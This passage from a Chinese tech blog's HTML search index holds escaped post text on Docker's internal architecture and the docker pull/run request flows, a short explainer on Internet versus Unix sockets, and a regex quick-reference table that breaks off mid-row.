&lt;p&gt;在 Docker 的启动过程中，通过包 gorilla/mux，创建了一个 mux.Router，提供请求的路由功能。在 Golang 中，gorilla/mux 是一个强大的 URL 路由器以及调度分发器。该 mux.Router 中添加了众多的路由项，每一个路由项由 HTTP 请求方法（PUT、POST、GET 或 DELETE）、URL、Handler 三部分组成。&lt;/p&gt;
&lt;p&gt;若 Docker Client 通过 HTTP 的形式访问 Docker Daemon，创建完 mux.Router 之后，Docker 将 Server 的监听地址以及 mux.Router 作为参数，创建一个 httpSrv=http.Server{}，最终执行 httpSrv.Serve() 为请求服务。&lt;/p&gt;
&lt;p&gt;在 Server 的服务过程中，Server 在 listener 上接受 Docker Client 的访问请求，并创建一个全新的 goroutine 来服务该请求。在 goroutine 中，首先读取请求内容，然后做解析工作，接着找到相应的路由项，随后调用相应的 Handler 来处理该请求，最后 Handler 处理完请求之后回复该请求。&lt;/p&gt;
&lt;p&gt;需要注意的是：Docker Server 的运行在 Docker 的启动过程中，是靠一个名为&amp;quot;serveapi&amp;quot;的 job 的运行来完成的。原则上，Docker Server 的运行是众多 job 中的一个，但是为了强调 Docker Server 的重要性以及为后续 job 服务的重要特性，将该&amp;quot;serveapi&amp;quot;的 job 单独抽离出来分析，理解为 Docker Server。&lt;/p&gt;
&lt;h4 id=&#34;docker-engine&#34;&gt;Docker engine&lt;/h4&gt;
&lt;p&gt;Engine 是 Docker 架构中的运行引擎，同时也 Docker 运行的核心模块。它扮演 Docker container 存储仓库的角色，并且通过执行 job 的方式来操纵管理这些容器。&lt;/p&gt;
&lt;p&gt;在 Engine 数据结构的设计与实现过程中，有一个 handler 对象。该 handler 对象存储的都是关于众多特定 job 的 handler 处理访问。举例说明，Engine 的 handler 对象中有一项为：{“create”: daemon.ContainerCreate,}，则说明当名为&amp;quot;create&amp;quot;的 job 在运行时，执行的是 daemon.ContainerCreate 的 handler。&lt;/p&gt;
&lt;h4 id=&#34;job&#34;&gt;Job&lt;/h4&gt;
&lt;p&gt;一个 Job 可以认为是 Docker 架构中 Engine 内部最基本的工作执行单元。Docker 可以做的每一项工作，都可以抽象为一个 job。例如：在容器内部运行一个进程，这是一个 job；创建一个新的容器，这是一个 job，从 Internet 上下载一个文档，这是一个 job；包括之前在 Docker Server 部分说过的，创建 Server 服务于 HTTP 的 API，这也是一个 job，等等。&lt;/p&gt;
&lt;p&gt;Job 的设计者，把 Job 设计得与 Unix 进程相仿。比如说：Job 有一个名称，有参数，有环境变量，有标准的输入输出，有错误处理，有返回状态等。&lt;/p&gt;
&lt;h3 id=&#34;docker-registry&#34;&gt;Docker Registry&lt;/h3&gt;
&lt;p&gt;Docker Registry 是一个存储容器镜像的仓库。而容器镜像是在容器被创建时，被加载用来初始化容器的文件架构与目录。&lt;/p&gt;
&lt;p&gt;在 Docker 的运行过程中，Docker Daemon 会与 Docker Registry 通信，并实现搜索镜像、下载镜像、上传镜像三个功能，这三个功能对应的 job 名称分别为&amp;quot;search&amp;quot;，“pull” 与 “push”。&lt;/p&gt;
&lt;p&gt;其中，在 Docker 架构中，Docker 可以使用公有的 Docker Registry，即大家熟知的&lt;a href=&#34;https://registry.hub.docker.com/&#34;&gt; Docker Hub &lt;/a&gt;，如此一来，Docker 获取容器镜像文件时，必须通过互联网访问 Docker Hub；同时 Docker 也允许用户构建本地私有的 Docker Registry，这样可以保证容器镜像的获取在内网完成。&lt;/p&gt;
&lt;h3 id=&#34;graph&#34;&gt;Graph&lt;/h3&gt;
&lt;p&gt;Graph 在 Docker 架构中扮演已下载容器镜像的保管者，以及已下载容器镜像之间关系的记录者。一方面，Graph 存储着本地具有版本信息的文件系统镜像，另一方面也通过 GraphDB 记录着所有文件系统镜像彼此之间的关系。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526431246.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;其中，GraphDB 是一个构建在 SQLite 之上的小型图数据库，实现了节点的命名以及节点之间关联关系的记录。它仅仅实现了大多数图数据库所拥有的一个小的子集，但是提供了简单的接口表示节点之间的关系。&lt;/p&gt;
&lt;p&gt;同时在 Graph 的本地目录中，关于每一个的容器镜像，具体存储的信息有：该容器镜像的元数据，容器镜像的大小信息，以及该容器镜像所代表的具体 rootfs。&lt;/p&gt;
&lt;h3 id=&#34;driver&#34;&gt;Driver&lt;/h3&gt;
&lt;p&gt;Driver 是 Docker 架构中的驱动模块。通过 Driver 驱动，Docker 可以实现对 Docker 容器执行环境的定制。由于 Docker 运行的生命周期中，并非用户所有的操作都是针对 Docker 容器的管理，另外还有关于 Docker 运行信息的获取，Graph 的存储与记录等。因此，为了将 Docker 容器的管理从 Docker Daemon 内部业务逻辑中区分开来，设计了 Driver 层驱动来接管所有这部分请求。&lt;/p&gt;
&lt;p&gt;在 Docker Driver 的实现中，可以分为以下三类驱动：graphdriver、networkdriver 和 execdriver。&lt;/p&gt;
&lt;p&gt;graphdriver 主要用于完成容器镜像的管理，包括存储与获取。即当用户需要下载指定的容器镜像时，graphdriver 将容器镜像存储在本地的指定目录；同时当用户需要使用指定的容器镜像来创建容器的 rootfs 时，graphdriver 从本地镜像存储目录中获取指定的容器镜像。&lt;/p&gt;
&lt;p&gt;在 graphdriver 的初始化过程之前，有 4 种文件系统或类文件系统在其内部注册，它们分别是 aufs、btrfs、vfs 和 devmapper。而 Docker 在初始化之时，通过获取系统环境变量”DOCKER_DRIVER”来提取所使用 driver 的指定类型。而之后所有的 graph 操作，都使用该 driver 来执行。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526448180.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;networkdriver 的用途是完成 Docker 容器网络环境的配置，其中包括 Docker 启动时为 Docker 环境创建网桥；Docker 容器创建时为其创建专属虚拟网卡设备；以及为 Docker 容器分配 IP、端口并与宿主机做端口映射，设置容器防火墙策略等。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526455756.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;execdriver 作为 Docker 容器的执行驱动，负责创建容器运行命名空间，负责容器资源使用的统计与限制，负责容器内部进程的真正运行等。在 execdriver 的实现过程中，原先可以使用 LXC 驱动调用 LXC 的接口，来操纵容器的配置以及生命周期，而现在 execdriver 默认使用 native 驱动，不依赖于 LXC。具体体现在 Daemon 启动过程中加载的 ExecDriverflag 参数，该参数在配置文件已经被设为&amp;quot;native&amp;quot;。这可以认为是 Docker 在 1.2 版本上一个很大的改变，或者说 Docker 实现跨平台的一个先兆。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526471557.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;libcontainer&#34;&gt;libcontainer&lt;/h3&gt;
&lt;p&gt;libcontainer 是 Docker 架构中一个使用 Go 语言设计实现的库，设计初衷是希望该库可以不依靠任何依赖，直接访问内核中与容器相关的 API。&lt;/p&gt;
&lt;p&gt;正是由于 libcontainer 的存在，Docker 可以直接调用 libcontainer，而最终操纵容器的 namespace、cgroups、apparmor、网络设备以及防火墙规则等。这一系列操作的完成都不需要依赖 LXC 或者其他包。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526480319.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;另外，libcontainer 提供了一整套标准的接口来满足上层对容器管理的需求。或者说，libcontainer 屏蔽了 Docker 上层对容器的直接管理。又由于 libcontainer 使用 Go 这种跨平台的语言开发实现，且本身又可以被上层多种不同的编程语言访问，因此很难说，未来的 Docker 就一定会紧紧地和 Linux 捆绑在一起。而于此同时，Microsoft 在其著名云计算平台 Azure 中，也添加了对 Docker 的支持，可见 Docker 的开放程度与业界的火热度。&lt;/p&gt;
&lt;p&gt;暂不谈 Docker，由于 libcontainer 的功能以及其本身与系统的松耦合特性，很有可能会在其他以容器为原型的平台出现，同时也很有可能催生出云计算领域全新的项目。&lt;/p&gt;
&lt;h3 id=&#34;docker-container&#34;&gt;Docker container&lt;/h3&gt;
&lt;p&gt;Docker container（Docker 容器）是 Docker 架构中服务交付的最终体现形式。&lt;/p&gt;
&lt;p&gt;Docker 按照用户的需求与指令，订制相应的 Docker 容器：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户通过指定容器镜像，使得 Docker 容器可以自定义 rootfs 等文件系统；&lt;/li&gt;
&lt;li&gt;用户通过指定计算资源的配额，使得 Docker 容器使用指定的计算资源；&lt;/li&gt;
&lt;li&gt;用户通过配置网络及其安全策略，使得 Docker 容器拥有独立且安全的网络环境；&lt;/li&gt;
&lt;li&gt;用户通过指定运行的命令，使得 Docker 容器执行指定的工作。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526493283.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;docker-运行案例分析&#34;&gt;Docker 运行案例分析&lt;/h2&gt;
&lt;h3 id=&#34;docker-pull命令&#34;&gt;docker pull命令&lt;/h3&gt;
&lt;p&gt;docker pull 命令的作用为：从 Docker Registry 中下载指定的容器镜像，并存储在本地的 Graph 中，以备后续创建 Docker 容器时的使用。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526502858.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如图，图中标记的红色箭头表示 docker pull 命令在发起后，Docker 所做的一系列运行。以下逐一分析这些步骤。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Docker Client 接受 docker pull 命令，解析完请求以及收集完请求参数之后，发送一个 HTTP 请求给 Docker Server，HTTP 请求方法为 POST，请求 URL 为&amp;quot;/images/create? &amp;quot;+“xxx”；&lt;/li&gt;
&lt;li&gt;Docker Server 接受以上 HTTP 请求，并交给 mux.Router，mux.Router 通过 URL 以及请求方法来确定执行该请求的具体 handler；&lt;/li&gt;
&lt;li&gt;mux.Router 将请求路由分发至相应的 handler，具体为 PostImagesCreate；&lt;/li&gt;
&lt;li&gt;在 PostImageCreate 这个 handler 之中，一个名为&amp;quot;pull&amp;quot;的 job 被创建，并开始执行；&lt;/li&gt;
&lt;li&gt;名为&amp;quot;pull&amp;quot;的 job 在执行过程中，执行 pullRepository 操作，即从 Docker Registry 中下载相应的一个或者多个 image；&lt;/li&gt;
&lt;li&gt;名为&amp;quot;pull&amp;quot;的 job 将下载的 image 交给 graphdriver；&lt;/li&gt;
&lt;li&gt;graphdriver 负责将 image 进行存储，一方创建 graph 对象，另一方面在 GraphDB 中记录 image 之间的关系。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;docker-run&#34;&gt;docker run&lt;/h3&gt;
&lt;p&gt;docker run 命令的作用是在一个全新的 Docker 容器内部运行一条指令。Docker 在执行这条命令的时候，所做工作可以分为两部分：第一，创建 Docker 容器所需的 rootfs；第二，创建容器的网络等运行环境，并真正运行用户指令。因此，在整个执行流程中，Docker Client 给 Docker Server 发送了两次 HTTP 请求，第二次请求的发起取决于第一次请求的返回状态。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1626526513596.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如图，图中标记的红色箭头表示 docker run 命令在发起后，Docker 所做的一系列运行。以下逐一分析这些步骤。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Docker Client 接受 docker run 命令，解析完请求以及收集完请求参数之后，发送一个 HTTP 请求给 Docker Server，HTTP 请求方法为 POST，请求 URL 为&amp;quot;/containers/create? &amp;quot;+“xxx”；&lt;/li&gt;
&lt;li&gt;Docker Server 接受以上 HTTP 请求，并交给 mux.Router，mux.Router 通过 URL 以及请求方法来确定执行该请求的具体 handler；&lt;/li&gt;
&lt;li&gt;mux.Router 将请求路由分发至相应的 handler，具体为 PostContainersCreate；&lt;/li&gt;
&lt;li&gt;在 PostImageCreate 这个 handler 之中，一个名为&amp;quot;create&amp;quot;的 job 被创建，并开始让该 job 运行；&lt;/li&gt;
&lt;li&gt;名为&amp;quot;create&amp;quot;的 job 在运行过程中，执行 Container.Create 操作，该操作需要获取容器镜像来为 Docker 容器创建 rootfs，即调用 graphdriver；&lt;/li&gt;
&lt;li&gt;graphdriver 从 Graph 中获取创建 Docker 容器 rootfs 所需要的所有的镜像；&lt;/li&gt;
&lt;li&gt;graphdriver 将 rootfs 所有镜像，加载安装至 Docker 容器指定的文件目录下；&lt;/li&gt;
&lt;li&gt;若以上操作全部正常执行，没有返回错误或异常，则 Docker Client 收到 Docker Server 返回状态之后，发起第二次 HTTP 请求。请求方法为&amp;quot;POST&amp;quot;，请求 URL 为&amp;quot;/containers/&amp;quot;+container_ID+&amp;quot;/start&amp;quot;；&lt;/li&gt;
&lt;li&gt;Docker Server 接受以上 HTTP 请求，并交给 mux.Router，mux.Router 通过 URL 以及请求方法来确定执行该请求的具体 handler；、&lt;/li&gt;
&lt;li&gt;mux.Router 将请求路由分发至相应的 handler，具体为 PostContainersStart；&lt;/li&gt;
&lt;li&gt;在 PostContainersStart 这个 handler 之中，名为&amp;quot;start&amp;quot;的 job 被创建，并开始执行；&lt;/li&gt;
&lt;li&gt;名为&amp;quot;start&amp;quot;的 job 执行完初步的配置工作后，开始配置与创建网络环境，调用 networkdriver；&lt;/li&gt;
&lt;li&gt;networkdriver 需要为指定的 Docker 容器创建网络接口设备，并为其分配 IP，port，以及设置防火墙规则，相应的操作转交至 libcontainer 中的 netlink 包来完成；&lt;/li&gt;
&lt;li&gt;netlink 完成 Docker 容器的网络环境配置与创建；&lt;/li&gt;
&lt;li&gt;返回至名为&amp;quot;start&amp;quot;的 job，执行完一些辅助性操作后，job 开始执行用户指令，调用 execdriver；&lt;/li&gt;
&lt;li&gt;execdriver 被调用，初始化 Docker 容器内部的运行环境，如命名空间，资源控制与隔离，以及用户命令的执行，相应的操作转交至 libcontainer 来完成；&lt;/li&gt;
&lt;li&gt;libcontainer 被调用，完成 Docker 容器内部的运行环境初始化，并最终执行用户要求启动的命令。&lt;/li&gt;
&lt;/ol&gt;
">【容器】Docker 源码架构</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/internetunix-socket/"" data-c="
          &lt;p&gt;socket是计算机之间进行通信的一种约定或一种方式。通过 socket 这种约定，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据。socket实现了网络协议栈的网络层和传输层。&lt;/p&gt;
&lt;p&gt;UNIX/Linux 中的一切都是文件，为了统一对各种硬件的操作，简化接口，不同的硬件设备也都被看成一个文件。对这些文件的操作，等同于对磁盘上普通文件的操作。&lt;/p&gt;
&lt;p&gt;为了表示和区分已经打开的文件，UNIX/Linux 会给每个文件分配一个 ID，这个 ID 就是一个整数，被称为文件描述符（File Descriptor）。例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常用 0 来表示标准输入文件（stdin），它对应的硬件设备就是键盘；&lt;/li&gt;
&lt;li&gt;通常用 1 来表示标准输出文件（stdout），它对应的硬件设备就是显示器。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;UNIX/Linux 程序在执行任何形式的 I/O 操作时，都是在读取或者写入一个文件描述符。一个文件描述符只是一个和打开的文件相关联的整数，它的背后可能是一个硬盘上的普通文件、FIFO、管道、终端、键盘、显示器，甚至是一个网络连接。&lt;/p&gt;
&lt;p&gt;通过 socket() 函数可以创建一个网络连接，或者说打开一个网络文件，socket() 的返回值就是文件描述符。剩下的操作就是对这个文件的操作了。&lt;/p&gt;
&lt;p&gt;Internet套接字用于网络上两个主机之间的交互，Unix套接字用于单个主机上两个进程之间的交互。&lt;/p&gt;
&lt;p&gt;Internet socket通过监听ip和端口号，而Unix socket是通过监听socket类型的文件在文件系统上的路径。&lt;/p&gt;
&lt;p&gt;两种传输方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SOCK_STREAM&lt;br&gt;
传输层使用TCP连接，可靠、按序、异步&lt;/li&gt;
&lt;li&gt;SOCK_DGRAM&lt;br&gt;
传输层使用UDP连接，快速、非顺序、同步&lt;/li&gt;
&lt;/ul&gt;
">Internet/Unix socket</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/zheng-ze-biao-da-shi-su-cha-biao/"" data-c="
          &lt;h3 id=&#34;基本语法&#34;&gt;基本语法&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;reg&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;\&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，&lt;code&gt;n&lt;/code&gt;匹配字符&lt;code&gt;n&lt;/code&gt;。&lt;code&gt;\n&lt;/code&gt;匹配一个换行符。串行&lt;code&gt;\\&lt;/code&gt;匹配&lt;code&gt;\&lt;/code&gt;而&lt;code&gt;\(&lt;/code&gt;则匹配&lt;code&gt;(&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;^&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配&lt;code&gt;\n&lt;/code&gt;或&lt;code&gt;\r&lt;/code&gt;之后的位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配&lt;code&gt;\n&lt;/code&gt;或&lt;code&gt;\r&lt;/code&gt;之前的位置。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配前面的子表达式零次或多次。例如，zo*能匹配&lt;code&gt;z&lt;/code&gt;以及&lt;code&gt;zoo&lt;/code&gt;。*等价于{0,}。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配前面的子表达式一次或多次。例如，&lt;code&gt;zo+&lt;/code&gt;能匹配&lt;code&gt;zo&lt;/code&gt;以及&lt;code&gt;zoo&lt;/code&gt;，但不能匹配&lt;code&gt;z&lt;/code&gt;。+等价于{1,}。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配前面的子表达式零次或一次。例如，&lt;code&gt;do(es)?&lt;/code&gt;可以匹配&lt;code&gt;does&lt;/code&gt;或&lt;code&gt;does&lt;/code&gt;中的&lt;code&gt;do&lt;/code&gt;。?等价于{0,1}。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n}&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;n是一个非负整数。匹配确定的n次。例如，&lt;code&gt;o{2}&lt;/code&gt;不能匹配&lt;code&gt;Bob&lt;/code&gt;中的&lt;code&gt;o&lt;/code&gt;，但是能匹配&lt;code&gt;food&lt;/code&gt;中的两个o。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n,}&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;n是一个非负整数。至少匹配n次。例如，&lt;code&gt;o{2,}&lt;/code&gt;不能匹配&lt;code&gt;Bob&lt;/code&gt;中的&lt;code&gt;o&lt;/code&gt;，但能匹配&lt;code&gt;foooood&lt;/code&gt;中的所有o。&lt;code&gt;o{1,}&lt;/code&gt;等价于&lt;code&gt;o+&lt;/code&gt;。&lt;code&gt;o{0,}&lt;/code&gt;则等价于&lt;code&gt;o*&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;{n,m}&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;m和n均为非负整数，其中n&amp;lt;=m。最少匹配n次且最多匹配m次。例如，&lt;code&gt;o{1,3}&lt;/code&gt;将匹配&lt;code&gt;fooooood&lt;/code&gt;中的前三个o。&lt;code&gt;o{0,1}&lt;/code&gt;等价于&lt;code&gt;o?&lt;/code&gt;。请注意在逗号和两个数之间不能有空格。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;?&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;当该字符紧跟在任何一个其他限制符（*,+,?，{n}，{n,}，{n,m}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串&lt;code&gt;oooo&lt;/code&gt;，&lt;code&gt;o+?&lt;/code&gt;将匹配单个&lt;code&gt;o&lt;/code&gt;，而&lt;code&gt;o+&lt;/code&gt;将匹配所有&lt;code&gt;o&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配除&lt;code&gt;\n&lt;/code&gt;之外的任何单个字符。要匹配包括&lt;code&gt;\n&lt;/code&gt;在内的任何字符，请使用像`(.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用&lt;code&gt;\(&lt;/code&gt;或&lt;code&gt;\)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?:pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符`(&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?=pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，`Windows(?=95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?!pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如`Windows(?!95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?&amp;lt;=pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，`(?&amp;lt;=95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(?&amp;lt;!pattern)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;反向否定预查，与正向否定预查类拟，只是方向相反。例如`(?&amp;lt;!95&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;x&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;y&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[xyz]&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;字符集合。匹配所包含的任意一个字符。例如，&lt;code&gt;[abc]&lt;/code&gt;可以匹配&lt;code&gt;plain&lt;/code&gt;中的&lt;code&gt;a&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[^xyz&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;负值字符集合。匹配未包含的任意字符。例如，&lt;code&gt;[^abc]&lt;/code&gt;可以匹配&lt;code&gt;plain&lt;/code&gt;中的&lt;code&gt;p&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[a-z]&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;字符范围。匹配指定范围内的任意字符。例如，&lt;code&gt;[a-z]&lt;/code&gt;可以匹配&lt;code&gt;a&lt;/code&gt;到&lt;code&gt;z&lt;/code&gt;范围内的任意小写字母字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[^a-z]&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;负值字符范围。匹配任何不在指定范围内的任意字符。例如，&lt;code&gt;[^a-z]&lt;/code&gt;可以匹配任何不在&lt;code&gt;a&lt;/code&gt;到&lt;code&gt;z&lt;/code&gt;范围内的任意字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\b&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个单词边界，也就是指单词和空格间的位置。例如，&lt;code&gt;er\b&lt;/code&gt;可以匹配&lt;code&gt;never&lt;/code&gt;中的&lt;code&gt;er&lt;/code&gt;，但不能匹配&lt;code&gt;verb&lt;/code&gt;中的&lt;code&gt;er&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\B&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配非单词边界。&lt;code&gt;er\B&lt;/code&gt;能匹配&lt;code&gt;verb&lt;/code&gt;中的&lt;code&gt;er&lt;/code&gt;，但不能匹配&lt;code&gt;never&lt;/code&gt;中的&lt;code&gt;er&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\cx&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配由x指明的控制字符。例如，\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的&lt;code&gt;c&lt;/code&gt;字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\d&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个数字字符。等价于[0-9]。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\D&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个非数字字符。等价于[^0-9]。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\f&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个换页符。等价于\x0c和\cL。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\n&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个换行符。等价于\x0a和\cJ。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\r&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个回车符。等价于\x0d和\cM。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\s&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\S&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配任何非空白字符。等价于[^ \f\n\r\t\v]。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\t&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个制表符。等价于\x09和\cI。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\v&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配一个垂直制表符。等价于\x0b和\cK。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\w&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配包括下划线的任何单词字符。等价于&lt;code&gt;[A-Za-z0-9_]&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\W&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;匹配任何非单词字符。等价于&lt;code&gt;[^A-Za-z0-9_]&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;\xn&lt;/td&gt;
